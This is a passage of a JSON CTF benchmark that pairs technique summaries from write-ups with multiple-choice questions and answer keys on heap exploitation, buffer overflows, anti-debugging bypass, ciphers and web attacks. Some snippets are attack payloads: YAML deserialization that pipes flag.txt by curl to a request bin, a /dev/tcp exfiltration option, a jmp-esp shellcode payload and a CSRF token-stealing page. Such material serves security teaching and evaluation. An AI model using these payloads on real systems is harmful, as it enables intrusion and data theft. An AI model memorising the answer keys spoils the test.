            "In a capture-the-flag challenge, attackers are required to navigate a binary tree directory structure to find a flag file. The environment restricts each exploit to a maximum of 512 characters, and attackers can gain higher directory access levels using a `key` binary in each directory. Considering these conditions, which part of a self-replicating script would effectively automate a depth-first search of the binary tree structure, assuming each `key` binary needs a specific payload for execution and the script is named `/tmp/solve.sh`?  - A. `find / -name \"flag.txt\" -exec cat {} \\;` - B. `for dir in $(ls); do cd $dir; ./key; done` - C. `payload=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd; (echo $payload && echo \"cd room0 && exec bash /tmp/solve.sh\") | ./key > /dev/null; (echo $payload && echo \"cd room1 && exec bash /tmp/solve.sh\") | ./key > /dev/null` - D. `if [ -f \"flag.txt\" ]; then cat flag.txt; else echo \"Flag not found\"; fi` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Write me a book",
        "write_up": "dataset/raw/Write me a book.md",
        "type": "pwn",
        "competition": [
            "GreyCatTheFlag/2023/Quals",
            "https://ctftime.org/event/1938/tasks/"
        ],
        "score": 349,
        "max_score": 349,
        "difficulty": 1.0,
        "knowledge": [
            "In heap exploitation challenges where overlapping chunks can be achieved, use out-of-bound writes to manipulate the chunk size or the forward pointer in the heap metadata. This can lead to arbitrary memory write or tcache poisoning, which allows for control over the heap and potentially executing arbitrary code. A specific technique is to overwrite a chunk's size to merge it with adjacent chunks, creating a larger, contiguous, and controllable region in memory.",
            "To leak libc addresses in environments where direct leaks are prevented or where PIE (Position Independent Executables) is enabled, utilize entries in the GOT (Global Offset Table) or output functions like `puts` to leak addresses. This approach entails overwriting entries in the GOT with the address of a libc function like `puts`, and subsequently invoking a function call that uses the overwritten GOT entry to leak a libc address. This technique can bypass restrictions on direct memory access and facilitate the calculation of the libc base address for further exploitation.\n\nExample payload for GOT overwrite to leak libc addresses:\n```python\nedit(2, pwn.flat([  \n       pwn.p64(exe.sym.puts)  # Overwrites free@got with puts' address.\n]))\nenable_print(3)\nlibc.address = libc_leak_free(1)  # free(1) now actually calls puts, leaking the address of a libc symbol.\n```"
        ],
        "question": [
            "In a heap exploitation scenario, you've created overlapping chunks leveraging an out-of-band (OOB) write vulnerability. To further exploit this for arbitrary memory writes or tcache poisoning, what is an effective technique to manipulate the heap? - A.Overwrite the forward pointer to a function pointer for indirect control. - B.Directly inject shellcode into the overlapping chunk for immediate execution. - C.Overwrite a chunk's size metadata to merge it with adjacent chunks, creating a larger controllable region. - D.Allocate and free chunks in a specific sequence to cause a heap spray. ",
            "When attempting to leak libc addresses in a secure environment where direct leaks are prevented, which technique is advisable for indirectly extracting these addresses? - A.Use a format string vulnerability to print the stack contents directly, revealing libc addresses. - B.Overwrite entries in the Global Offset Table (GOT) with the address of a libc function, then call a function that uses the overwritten entry to leak an address. - C.Increment pointers on the stack until they point to libc addresses, then read these values out. - D.Encrypt and decrypt the binary's text segment to reveal hidden libc addresses. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "write-flag-where",
        "write_up": "dataset/raw/write-flag-where.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": 50,
        "max_score": 320,
        "difficulty": 0.15625,
        "knowledge": [
            "In scenarios where a binary has Position Independent Executable (PIE) enabled, locating static data or code segments' actual runtime address requires calculating their addresses based on runtime memory mappings. This can be achieved by parsing the program's memory mappings from `/proc/self/maps`, identifying the base address of the binary, and adding the known offset to a target location (e.g., a string or function within the binary). This approach is particularly useful for exploiting vulnerabilities that require precise memory write operations. Example usage involves extracting the base address from `/proc/self/maps`, then calculating the target address by adding a known offset to this base address.",
            "When working with exploits that require interacting with a program's input/output, if direct interaction causes issues (e.g., due to redirections to `/dev/null` or modifications to file descriptors), consider using system settings or environment variables to bypass these limitations. For example, the `ulimit -n <number>` command can be used to increase the maximum number of open file descriptors for the current shell session, enabling interaction with file descriptors that the program assumes are unavailable or closed. This technique can be vital for exploiting binaries that manipulate their file descriptors to prevent easy interaction or exploitation."
        ],
        "question": [
            "Given a binary with PIE enabled, and you have the output of `/proc/self/maps` revealing the memory mappings. If you know a target string is located at an offset `0x21e0` within the binary, how would you calculate the runtime address of this string to use in an exploit? - A. Add the offset to the base address of `/usr/lib/x86_64-linux-gnu/libc.so.6` from the memory mappings. - B. Subtract the offset from the base address of the binary identified in the memory mappings. - C. Add the offset to the base address of the binary identified in the memory mappings. - D. Use the offset directly as the address without any calculations. ",
            "If executing a binary modifies its file descriptors so that `stdout`, `stderr`, and `stdin` are redirected to `/dev/null`, making traditional outputs invisible, which command could be used to bypass this limitation by adjusting the system's file descriptor limit, thereby facilitating interaction with the exploit process? - A. `chmod +x /dev/null` to make `/dev/null` executable. - B. `export MAX_FD=1338` to increase the environment maximum file descriptors. - C. `ulimit -s unlimited` to remove limitations on the stack size. - D. `ulimit -n 1338` to increase the maximum number of open file descriptors. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "www",
        "write_up": "dataset/raw/www.md",
        "type": "pwn",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving a stack buffer overflow vulnerability where the size check is absent, specifically in a case where a fixed-size buffer is used to handle string copying or concatenation (like using `strcpy` or `strcat` without size checks), payloads can be crafted to overflow the buffer. This can lead to execution of arbitrary code when security measures like NX or ASLR are not present, or when stack addresses can be predicted. In such scenarios, incorporating NOP sleds followed by shellcode into the overflow payload can be effective since it allows for a jump to the shellcode placed in the stack to execute arbitrary commands.",
            "Utilizing write primitive vulnerabilities that allow for arbitrary writes into memory can be enhanced by overwriting control variables (e.g., loop control variables) to gain unlimited usage of the vulnerability. This technique is particularly useful in scenarios where limited exploitation attempts would otherwise be a constraint. After gaining unlimited write capabilities, format string vulnerabilities can be exploited to leak memory addresses (such as stack addresses and libc addresses) by controlling the format string passed to functions like `printf`. This information can then be used to convert relative write operations into absolute ones or to execute a ROP chain by overwriting function pointers or return addresses. \n\n   - Example payload snippet to overwrite a variable and gain unlimited writes:\n     ```c\n     write('\\x01', -7, buffer); // Assuming `amount` is at offset -7 from `buffer`\n     ``` \n\n   - Example for leaking addresses using format strings:\n     ```c\n     printf(\"%15$p\"); // Leaks stack address\n     printf(\"%13$p\"); // Leaks libc address\n     ```"
        ],
        "question": [
            "In a scenario involving a stack buffer overflow in a function that copies a URL into a fixed-size command buffer without size validation, the presence of security mechanisms is critical for exploit success. Given an outdated environment without NX (no execute) and ASLR (address space layout randomization), which modern measure would have most effectively mitigated the exploitation via a crafted payload containing a NOP sled and shellcode? - A. Enabling stack canaries - B. Increasing the size of buffers - C. Using `strcpy()` instead of `strncpy()` - D. Disabling the computer's firewall ",
            "Within an exploit that gains unlimited write-what-where capabilities by modifying a loop control variable on the stack, which method allows an attacker to leak essential addresses and pivot to code execution? Assume the attacker uses a format string vulnerability present in a subsequent `printf()` call. - A. Overwriting the GOT entries for standard library functions to redirect to malicious code - B. Crafting payloads to brute-force stack canaries - C. Exploiting the arbitrary write to change local variable values unrelated to control flow - D. Using the unlimited writes to craft a format string that leaks stack and `libc` addresses, facilitating further exploitation "
        ],
        "answer": [
            "A. Enabling stack canaries",
            "D. Using the unlimited writes to craft a format string that leaks stack and `libc` addresses, facilitating further exploitation"
        ]
    },
    {
        "name": "x0rr3al_",
        "write_up": "dataset/raw/x0rr3al_.md",
        "type": "reverse",
        "competition": [
            "vsCTF/2023",
            "https://ctftime.org/event/2053/tasks/"
        ],
        "score": -1.0,
        "max_score": 489,
        "difficulty": -1,
        "knowledge": [
            "When faced with a binary that performs string obfuscation using XOR operations, it's viable to reverse the XOR operation by applying the same XOR key to the obfuscated data. This approach can be used to reveal hidden strings within the binary. In scenarios where the XOR key and encoded strings are known, one can execute similar deobfuscation using a simple C program or script. This method involves using the XOR key against every byte of the obfuscated data to retrieve the original string. For example, given a byte of data `b` and a key `k`, the operation to retrieve the original byte would be `b ^= k;`.",
            "In binaries utilizing anti-debugging techniques such as ptrace or environmental checks (e.g., for debugger processes like gdb, ollydbg, strace), it's possible to bypass these by either modifying the binary to invert the branch that checks for the debugging environment or by using an LD_PRELOAD trick to override functions like strstr that are used for environment checks. This allows for debugging or analysis of the binary without being hindered by the anti-debugging measures. When dealing with strstr checks, an example LD_PRELOAD override could be as follows:\n   \n   ```c\n   char* strstr(const char* haystack, const char* needle) {\n     printf(\"haystack=%s and needle=%s\\n\", haystack, needle);\n     return 0;\n   }\n   ```\n   \n   This function could be compiled into a shared object and preloaded to intercept calls to `strstr`, thereby revealing what the binary is searching for in its anti-debugging checks and allowing a researcher to bypass them."
        ],
        "question": [
            "Given the scenario where you have a binary that hides a message through XOR string obfuscation with a XOR key of `0x12`, and you have partially decoded bytes as `0x76`, `0x6f`, `0x78`, which are part of the obfuscated data. To fully decode the message, how do you determine the original byte value for each obfuscated byte? - A. `original_byte = obfuscated_byte + 0x12;` - B. `original_byte = obfuscated_byte ^ 0x12;` - C. `original_byte = obfuscated_byte / 0x12;` - D. `original_byte = obfuscated_byte - 0x12;`",
            "In a scenario where a binary performs environment checks to detect debugging tools, and you wish to bypass these checks without modifying the binary directly, which of the following techniques could be effectively used by injecting a shared object that intercepts and manipulates certain function calls such as `strstr` to always return null, thus tricking the binary into thinking that no debugging tools are present? - A. Modifying the binary to skip environment checks. - B. Using an LD_PRELOAD trick to intercept and modify the behavior of `strstr`. - C. Renaming the debugger tools to bypass the checks. - D. Running the binary in a virtual machine to hide the debugger's presence."
        ],
        "answer": [
            "B. `original_byte = obfuscated_byte ^ 0x12;`",
            "B. Using an LD_PRELOAD trick to intercept and modify the behavior of `strstr`."
        ]
    },
    {
        "name": "xkcd",
        "write_up": "dataset/raw/xkcd.com_2247 v2.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2020",
            "https://ctftime.org/event/939/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with Hill Cipher challenges, if the encryption key is provided as a long string of characters, it may indicate the size of the encryption matrix. To decrypt, convert the encryption key to numerical values modulo 26 (representing each letter's position in the alphabet), organize them into a matrix of the given size, and then calculate the inverse of this matrix using mathematical software like SageMath to obtain the decryption matrix.",
            "Once the decryption matrix is obtained, apply it to the ciphertext, which has been similarly converted to numerical values, to decrypt the message. This involves left multiplying the ciphertext matrix by the decryption matrix. After performing the matrix multiplication, convert the resulting numerical values back to letters to reveal the plaintext. Use common sense or keyword searching through the decrypted text to locate the flag."
        ],
        "question": [
            "When using Hill Cipher for decryption, given an encryption key as a long string of lowercase characters, which step accurately describes converting this key into a numerical format suitable for creating an encryption matrix? - A. Count the number of occurrences of each letter and map them to numbers 0-25 in order of frequency. - B. Directly assign each character a unique number starting from 1 onwards. - C. Convert each letter to its corresponding ASCII value. - D. Convert each letter to its position in the alphabet (a=0, b=1, ..., z=25), suitable for modulo 26 operations.",
            "In the context of decrypting a Hill Cipher-encrypted message using SageMath, after obtaining the decryption matrix, how should the ciphertext be prepared for decryption? - A. Convert the ciphertext into a hexadecimal representation and then apply the decryption matrix. - B. Leave the ciphertext as is and directly multiply it by the decryption matrix without any conversions. - C. Convert the ciphertext into numerical values where each letter is mapped to its position in the alphabet (a=0, b=1, ..., z=25), arrange it into a matrix, and then left multiply it by the decryption matrix. - D. Encode the ciphertext into a binary format and perform bitwise operations with the decryption matrix."
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "xorz",
        "write_up": "dataset/raw/xorz.md",
        "type": "crypto",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 123,
        "max_score": 952,
        "difficulty": 0.12920168067226892,
        "knowledge": [
            "When given a ciphertext produced by a modified Vigenere cipher that involves XOR operations with both a key and a salt (constant string), first reverse the effect of the salt by XORing each byte of the ciphertext with the corresponding byte of the salt, cycled to the ciphertext's length. This preprocessing step simplifies the problem to a more traditional cipher structure, making it easier to apply further cryptographic analysis or brute force methods to retrieve the original plaintext or key.",
            "To break a modified Vigenere cipher that uses XOR operations and has unknown key length, apply frequency analysis across multiple possible key lengths. For each key length, organize the ciphertext into columns where each column corresponds to a character in the key. Perform frequency analysis on each column to identify the most likely byte value for each position in the key, based on expected letter frequencies in the plaintext language. This method exploits the statistical properties of the plaintext language (e.g., English) to infer the key.\n   \n   Example of frequency analysis logic for one possible key length:\n   ```\n   for k in keyPoolList[i]:\n       posFreq[k] = dict()\n       for c in cipher[i::keyLen]:\n           p = chr(k ^ c)\n           posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1\n   ```"
        ],
        "question": [
            "In a scenario involving a modified Vigenere cipher where the ciphertext is produced by XOR operations with both a key and a constant string (salt), which step should be taken first to simplify the decryption process? - A. Directly apply the Vigenere decryption formula without any modifications. - B. XOR each byte of the ciphertext with a randomly generated byte sequence. - C. Reverse the effect of the salt by XORing each byte of the ciphertext with the corresponding byte of the salt, cycled to the ciphertext's length. - D. Replace each byte of the ciphertext with its corresponding ASCII value.",
            "When attempting to decrypt a modified Vigenere cipher that utilizes XOR operations and has an unknown key length, which analysis technique is appropriate for identifying the most likely byte value for each position in the key? - A. Perform a simple substitution cipher analysis assuming a static key length. - B. Apply frequency analysis across multiple possible key lengths by organizing the ciphertext into columns corresponding to each character in the key, then analyzing the frequency of letters in each column to guess the byte value. - C. Use a direct hash comparison of cipher text bytes to plaintext bytes, bypassing the need for frequency analysis. - D. Implement a random guess approach where each byte of the key is guessed without statistical analysis of the ciphertext."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "YABO",
        "write_up": "dataset/raw/YABO.md",
        "type": "pwn",
        "competition": [
            "HacktivityCon/2021",
            "https://ctftime.org/event/1444/tasks/"
        ],
        "score": 478,
        "max_score": 500,
        "difficulty": 0.956,
        "knowledge": [
            "For challenges involving buffer overflows where direct execution control is required, searching for and utilizing a 'jmp esp' gadget can be an effective method to redirect execution flow to the stack, where shellcode can be placed. This is particularly useful in environments without stack execution protections (e.g., NX disabled). The 'jmp esp' gadget can be found using tools like Ropper or similar. Once found, this address can be used to overwrite the return address in a buffer overflow exploit, allowing for arbitrary code execution.\n   - Example payload construction segment:\n     ```python\n     jmp_esp = next(binary.search(asm('jmp esp')))\n     payload  = b''  \n     payload += 0x414 * b'A'  \n     payload += p32(jmp_esp)  \n     payload += shellcode\n     ```",
            "In scenarios where interaction with a network service is required post-exploitation or where standard input/output is not directly available, leveraging file descriptor duplication functions (e.g., `dup2`) within shellcode to redirect standard file descriptors (`stdin`, `stdout`, `stderr`) to a network socket can enable interaction with spawned shells over the network. This is crucial in remote exploit scenarios or services wrapped with network interfaces. The information needed to perform this (e.g., the file descriptor number) can often be obtained through analysis tools such as `strace`.\n   - Example shellcode snippet using `shellcraft` from pwntools for readability:\n     ```python\n     shellcode = asm(shellcraft.dupsh(4))\n     ```\n   - In this case, `4` is the file descriptor for the network connection as commonly seen in CTF challenges where `stdin`, `stdout`, `stderr` are `0`, `1`, `2`, and the service listening socket is `3`, making the first accepted connection `4`."
        ],
        "question": [
            "When exploiting a buffer overflow vulnerability without stack execution protection, why is locating a 'jmp esp' gadget critical, and how can it be utilized?  Scenario: You've discovered a buffer overflow vulnerability in a service and confirmed that NX is disabled, making it possible to execute code on the stack. Your next step involves searching for a suitable gadget to redirect execution flow to your shellcode placed on the stack.  - A. Use 'jmp esp' to execute a syscall directly from the registers, bypassing shellcode - B. Utilize 'jmp esp' to directly call system functions within the binary itself - C. Search for and use a 'jmp esp' gadget to redirect execution to the stack, where shellcode can be executed - D. Identify a 'jmp esp' gadget to prevent the stack from executing, enhancing exploit stability ",
            "In an exploitation scenario where direct standard input/output to a shell is not available due to the target being a network service, how can communication with a spawned shell over the network be enabled using shellcode?  Scenario: You're exploiting a remote buffer overflow vulnerability and have successfully directed execution to your shellcode. However, the target application is a network service, and you need to interact with the shell over the network. You recall that file descriptor duplication will be necessary to redirect `stdin`, `stdout`, and `stderr` over the network.  - A. Harden the shellcode against network interruption by duplicating unrelated file descriptors - B. Allocate new file descriptors for network communication without referring to the original socket file descriptor - C. Use `dup2` within shellcode to duplicate non-network file descriptors, preventing shell interaction - D. Leverage `dup2` in the shellcode to redirect `stdin`, `stdout`, `stderr` to the network socket file descriptor, enabling interaction with the shell over the network "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "yadlp",
        "write_up": "dataset/raw/yadlp.md",
        "type": "crypto",
        "competition": [
            "DownUnderCTF/2021",
            "https://ctftime.org/event/1312/tasks/"
        ],
        "score": 494,
        "max_score": 494,
        "difficulty": 1.0,
        "knowledge": [
            "When solving discrete logarithm problems in non-standard groups (such as hyperbolas rather than elliptic curves) and the operation law appears unconventional (e.g., based on Pell's equations or group laws not aligning with typical ECC operations), an effective approach involves identifying the group structure and applying specialized algorithms like Pohlig-Hellman for groups with known, factorizable orders. This process is facilitated by mapping out the operation, identity, and inversion within the group, enabling the use of algorithms optimized for these specific mathematical structures. For instance, when working with a hyperbolic curve group where the discrete log problem is set, verify the group's order (preferably smooth) and use Pohlig-Hellman algorithm for efficiency.\n\n    Conditions:\n    - The discrete logarithm problem is defined on non-elliptic curves, such as hyperbolas.\n    - The group order is smooth or factorizable into small primes.\n\n    Knowledge:\n    - For hyperbolic curve groups with discrete logarithm challenges, if the prime $$p \\equiv 3 \\pmod 4$$, the group order is likely $$p+1$$, allowing the Pohlig-Hellman algorithm to be applied effectively due to its dependence on the factorizability of the group's order.",
            "For solving the Modular Knapsack Problem, especially in cryptographic contexts where the goal is to find coefficients (e.g., $$x_0, ... x_5$$) that satisfy a modular equation with known summands, lattice-based methods, such as LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz) reduction, can be utilized. These methods are effective in reducing and solving complex modular equations by transforming them into lattice problems, which are then solved using algorithms designed for lattice operations. Tools and code snippets, like the one provided by `https://github.com/nneonneo/pwn-stuff/blob/master/math/solvelinmod.py`, can automate the resolution process, illustrating the practical utility of applying lattice theory in cryptographic challenges.\n\n    Conditions:\n    - The challenge involves solving an equation of the form $$ a x_0 + b x_1 + c x_2 + d x_3 + e x_4 + f x_5 \\equiv e \\pmod{p+1} $$.\n    - Coefficients and moduli are known, with the target being the discovery of the variables' values.\n\n    Knowledge:\n    - Lattice-based methods can efficiently resolve cryptographic problems framed as Modular Knapsack Problems by exploiting the mathematical properties of lattices to simplify and solve equations modularly, especially when traditional algebraic approaches (e.g., Gaussian elimination) prove ineffective."
        ],
        "question": [
            "When addressing a discrete logarithm problem on a hyperbolic curve where the identity element is represented as $(1, 0)$, and employing an unconventional group operation defined as follows:  ```python def G_add(A, B): x1, y1 = A x2, y2 = B return ((x1*x2 + D*y1*y2) % p, (x1*y2 + x2*y1 + 2*y1*y2) % p) ``` Given the prime $p \\equiv 3 \\pmod{4}$ leading to a group order of $p+1$, which factorization characteristic is preferable for utilizing the Pohlig-Hellman algorithm effectively?  - A. A prime number - B. A large composite number with random prime factors - C. A smooth number, specifically with small prime factors - D. A square-free number with large prime factors ",
            "In the context of solving the Modular Knapsack Problem with a constraint of the form:  $$ a x_0 + b x_1 + c x_2 + d x_3 + e x_4 + f x_5 \\equiv e \\pmod{p+1} $$  and knowing the aim is to find coefficients $x_0, \u2026, x_5$ satisfying this equation, which approach is particularly effective when traditional algebra fails?  - A. Applying the Euclidean algorithm for each coefficient individually - B. Using LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz) reduction to transform the problem into a lattice problem and solving it - C. Employing brute-force search for all possible combinations of coefficients - D. Utilizing differential calculus to find the coefficients as variables' derivatives "
        ],
        "answer": [
            "C. A smooth number, specifically with small prime factors",
            "B. Using LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz) reduction to transform the problem into a lattice problem and solving it"
        ]
    },
    {
        "name": "YAY",
        "write_up": "dataset/raw/YAY.md",
        "type": "The type of this CTF challenge is reverse engineering.",
        "competition": [
            "Securinets/2021/Quals",
            "https://ctftime.org/event/1308/tasks/"
        ],
        "score": 988,
        "max_score": 1000,
        "difficulty": 0.988,
        "knowledge": [
            "When encountering anti-debugging techniques that use direct system calls or manipulation of thread properties to disable debugging, tools like ScyllaHide can be utilized to bypass such checks. ScyllaHide hooks onto these calls allowing the debugger to continue its operation unaffected by the anti-debugging tricks employed by the binary. An approach to bypass anti-debugging looks for functions using `NtSetInformationThread` with the `ThreadHideFromDebugger` flag and employing ScyllaHide or similar tools to neutralize their effects.",
            "For challenges involving custom VMs or bytecode execution within a binary, reverse-engineering the bytecode handler functions can reveal the logic applied to user input or encrypted data. In scenarios where the task is to decipher an encoded string or input, understanding the operations (like rotate left (ROL) and rotate right (ROR)) used by the VM on the data is crucial. Once these operations are understood, a decoding script can be written in high-level languages like Python to simulate the VM's decoding process. Here, mapping the VM bytecode operations to actual programming constructs (e.g., shifting and bitwise operations) and applying them in reverse order if necessary, can decode the encrypted data.\n   \n   Example Python snippet for decoding based on custom VM bytecode logic:\n   ```python\n   import ctypes\n\n   srand_seed = 0x10c9\n   encoded_flag_hex = \"5F F2 16 2F ...\"\n   arr_len = len(bytes.fromhex(encoded_flag_hex.replace(\" \", \"\")))\n   \n   # Initialize srand to sync with VM's random generation\n   ctypes.cdll.msvcrt.srand(srand_seed)\n   arr = [(ctypes.cdll.msvcrt.rand() % 7) + 1 for _ in range(arr_len)]\n   \n   # Decode logic based on reversed custom VM operations\n   decoded_bytes = [((byte << (8 - arr[i])) | (byte >> arr[i])) & 0xFF for i, byte in enumerate(encoded_flag_hex)]\n   decoded_flag = bytes(decoded_bytes).decode()\n   print(decoded_flag)\n   ```\n   This script should be tailored based on the specific VM operations and sequence observed within the challenge."
        ],
        "question": [
            "When attempting to bypass a debugger detection mechanism in a binary application, which of the following system calls is typically targeted for hooking by tools like ScyllaHide to neutralize its effects? - A. `CreateProcess` - B. `NtQuerySystemInformation` - C. `NtSetInformationThread` - D. `ReadProcessMemory` ",
            "In reversing challenges featuring custom virtual machine (VM) encryption methods, which approach is generally effective for decrypting or decoding encoded data manipulated by VM bytecode operations? - A. Applying a brute-force attack using all possible VM operation combinations until the original data is recovered. - B. Writing a high-level simulation of the VM's logic, including its arithmetic and bitwise operations, to reverse the encoding process. - C. Directly analyzing the binary in a disassembler without consideration of the VM's operations, focusing only on static analysis. - D. Ignoring the VM bytecode logic and instead focusing on external tools for automatic decryption without understanding the underlying operations. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "YayRev",
        "write_up": "dataset/raw/YayRev.md",
        "type": "reverse",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 200,
        "max_score": 900,
        "difficulty": 0.2222222222222222,
        "knowledge": [
            "When dealing with a challenge that involves cipher text manipulation where the last characters are moved to the start, and a rotation cipher (like ROT13) is applied, the steps to decrypt or reverse the process may involve first identifying the pattern of manipulation applied to the original text and then applying the inverse of the manipulation. In this scenario, if the rotation cipher is known or identified (like ROT13), the `codecs` module in Python can be utilized to decode the cipher text. This approach is universally applicable to challenges involving similar text manipulations and known rotation ciphers.\n   - Example payload to reverse ROT13 in Python: `codecs.encode('decoded_text', 'rot_13')`",
            "In scenarios where the cipher text undergoes a specific manipulation order (e.g., the last few characters of a string are relocated to the beginning of the string, and then a rotation cipher is applied), reversing the process involves reversing each step in the opposite order. This means first applying the inverse of the rotation cipher (e.g., ROT13 applied again since ROT13 is its own inverse) and then relocating the characters back to their original positions. This approach is essential for challenges where the manipulation involves multiple steps that need to be undone in reverse order to retrieve the original text.\n   - No specific payload is provided for moving characters back to their original position since it depends on the manipulation specifics (e.g., the number of characters moved). However, the technique involves string slicing and concatenation in Python to reorder the characters."
        ],
        "question": [
            "In a scenario where a piece of Python code is used to decode a ROT13 cipher, which Python library function correctly performs the decoding of a cipher text `encrypted_text` back to plain text? - A. `codecs.decode('encrypted_text', 'rot_13')` - B. `codecs.encode('encrypted_text', 'base64')` - C. `codecs.encode('encrypted_text', 'rot_13')` - D. `codecs.decode('encrypted_text', 'base64')` ",
            "To reverse the process of a cipher where the last five characters have been moved to the start of a string and encrypted using ROT13, which process correctly describes the initial step to revert the string `encrypted_string` to its original form? - A. Use slicing to move the first five characters of `encrypted_string` to the end, then decode using ROT13. - B. Decode `encrypted_string` using ROT13, then use slicing to move the first five characters to the end. - C. Use slicing to move the last five characters of `encrypted_string` to the start, then decode using ROT13. - D. Decode `encrypted_string` using ROT13, then use slicing to move the last five characters to the start. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "yellsatjavascript",
        "write_up": "dataset/raw/yellsatjavascript.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 364,
        "max_score": 700,
        "difficulty": 0.52,
        "knowledge": [
            "When a JavaScript challenge involves restrictions on using direct references (like \"flag\", \".\", curly braces) to access variables or properties, Base64 encoding can be used to obfuscate the restricted words. Additionally, array syntax can be utilized to access object properties or methods to bypass dot notation restrictions.\n   - Example payload: `console['log'](eval(atob('ZmxhZw==')))`, where 'ZmxhZw==' is the Base64 encoding of \"flag\".",
            "The `eval()` function can be exploited in challenges to execute arbitrary JavaScript code, provided the input can be obfuscated to bypass any input filters in place. Leveraging encoding mechanisms like Base64 and alternative property access syntaxes are key to successfully exploiting these scenarios.\n   - No specific payload example can be provided as it heavily depends on the context of the input filters."
        ],
        "question": [
            "In a JavaScript challenge where you are restricted from using the string \"flag\", the dot character \".\", and curly braces, which method can be used to obfuscate the term \"flag\" and execute it to print the value stored in the flag variable using `console.log()`?  - A. Using the `atob()` function to decode a Base64 string and accessing properties via dot notation. - B. Directly calling `console.log(flag)` without any obfuscation. - C. Using the `btoa()` function to encode \"flag\" and then executing it without decoding. - D. Encoding \"flag\" into Base64, decoding it with `atob()`, and accessing `console.log` through array keys syntax. ",
            "When faced with input restrictions in a JavaScript application, how does exploiting the `eval()` function with Base64 encoding help execute arbitrary code?  - A. The `eval()` function only works with Base64 encoded strings and executes them as JavaScript code. - B. Encoding a malicious payload with Base64 and passing it to `eval()` prevents the execution of arbitrary code due to increased security measures. - C. By Base64 encoding payloads, `eval()` is tricked into executing decoded strings that may contain prohibited direct references, bypassing input filters. - D. `eval()` can directly execute Base64 without decoding, making it easier to bypass security filters. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Yet Another Micro-story Library",
        "write_up": "dataset/raw/Yet Another Micro-story Library.md",
        "type": "web",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "When faced with input forms handling YAML in web applications, it is possible to perform a Remote Code Execution (RCE) attack by crafting specific YAML payloads that exploit the Python object serialization and deserialization. This is particularly applicable when the server-side application is built with Python and inadequately sanitizes user input. Example payload for listing directory contents:  \n```yaml\n!!python/object/apply:os.system  \n - ls  \n```",
            "Data exfiltration can be achieved via crafted payloads in applications vulnerable to YAML deserialization attacks by piping the output of the desired command to a web-based exfiltration tool such as `curl` posting to a request bin. This method is useful when direct output is not visible or when dealing with blind remote code execution vulnerabilities. Example payload for exfiltrating the contents of `flag.txt`:  \n```yaml\n!!python/object/apply:os.system  \n - cat flag.txt | curl -X POST --data-binary @- https://postb.in/1601157034473-5430747917853  \n```"
        ],
        "question": [
            "When implementing a feature to handle YAML input in a web application, which example payload demonstrates an attack where an attacker can exploit Python\u2019s object serialization to perform a Remote Code Execution (RCE)? - A. `!!python/object:new:os.system [\"ls\"]` - B. `!!python/object/apply:os.system - ls` - C. `<script>alert('XSS')</script>` - D. `{'object':'os.system', 'function':'execute', 'parameters':'ls'}`",
            "In the context of vulnerabilities related to YAML deserialization in web applications, which payload exemplifies a method for data exfiltration using a remote code execution exploit to send the contents of a file to an external server? - A. `!!python/object/apply:os.system - ls > /dev/tcp/external.server.com/80` - B. `!!python/object/apply:os.system - cat important_file.txt > /var/www/html/exfiltrated.txt` - C. `<iframe src=\"http://external.server.com/steal.php?data=important_data\"></iframe>` - D. `!!python/object/apply:os.system - cat flag.txt | curl -X POST --data-binary @- https://postb.in/1601157034473-5430747917853`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "yeunote",
        "write_up": "dataset/raw/yeunote.md",
        "type": "The type of this challenge is **web**.",
        "competition": [
            "ViettelMates/2018",
            "https://ctftime.org/event/629/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In scenarios involving CSRF (Cross-Site Request Forgery) vulnerabilities that require a CSRF token to make POST requests, one can circumvent such protection if the CSRF token can be dynamically loaded through an externally referenced script provided by the target application. By crafting a page that includes the target's script, attackers can steal the CSRF token if same-origin policy protections can be bypassed. This approach requires manipulating `document.domain` or modifying HTTP headers to bypass referer checks, then utilizing the stolen CSRF token to perform actions on behalf of a logged-in user.  \nExample payload:  \n```html\n<meta name=\"referrer\" content=\"no-referrer\">\n<script src=\"https://target.com/csrf.js\"></script>\n<script>\nObject.defineProperty(document, 'domain', {value: \"target.com\"});\n</script>\n<form method=\"post\" action=\"https://target.com/action\">\n<input type=\"hidden\" name=\"csrf_token\" value=\"\">\n<!-- additional form fields here -->\n<input type=\"submit\" value=\"submit\">\n</form>\n<script>\n// Code to extract and set CSRF token from loaded script into the form's csrf_token field\n</script>\n```",
